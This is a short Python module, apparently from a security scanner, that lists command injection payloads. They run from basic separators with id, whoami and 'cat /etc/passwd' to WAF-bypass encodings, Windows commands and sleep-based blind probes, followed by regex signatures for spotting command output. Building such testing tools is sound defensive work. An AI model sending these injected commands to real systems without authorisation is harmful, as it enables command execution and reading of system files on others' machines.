"""Command injection payloads."""

# ── Tier 1: Unix command injection ────────────────────────────────────────────
CMDI_T1 = [
    "; id",
    "| id",
    "& id",
    "`id`",
    "$(id)",
    "; whoami",
    "| whoami",
    "& whoami",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; uname -a",
]

# ── Tier 2: WAF bypass / encoding ─────────────────────────────────────────────
CMDI_T2 = [
    # IFS separator
    ";${IFS}id",
    "|${IFS}id",
    # Brace expansion
    ";{id}",
    # Wildcard
    "/usr/b?n/id",
    # Quote breaking
    "';id;'",
    "\";id;\"",
    # URL-encoded semicolons
    "%3Bid",
    "%7Cid",
    # Null bytes
    "\x00; id",
    # Newline injection
    "\nid\n",
    # Windows equivalents
    "& whoami",
    "| whoami",
    "& net user",
    "| dir",
]

# ── Tier 3: Time-based (blind) ────────────────────────────────────────────────
CMDI_TIME = [
    "; sleep 5",
    "| sleep 5",
    "& sleep 5",
    "$(sleep 5)",
    "`sleep 5`",
    "; ping -c 5 127.0.0.1",  # 5 ICMP → ~5 seconds
    "& timeout 5",            # Windows
]

# ── Output signatures in response body ────────────────────────────────────────
CMDI_OUTPUT_SIGS = [
    r"uid=\d+",
    r"gid=\d+",
    r"root:x:0:0",
    r"www-data",
    r"nobody",
    r"daemon",
    r"/bin/bash",
    r"/bin/sh",
    r"nt authority\\system",
    r"windows nt",
    r"microsoft windows",
    r"volume serial number",
]
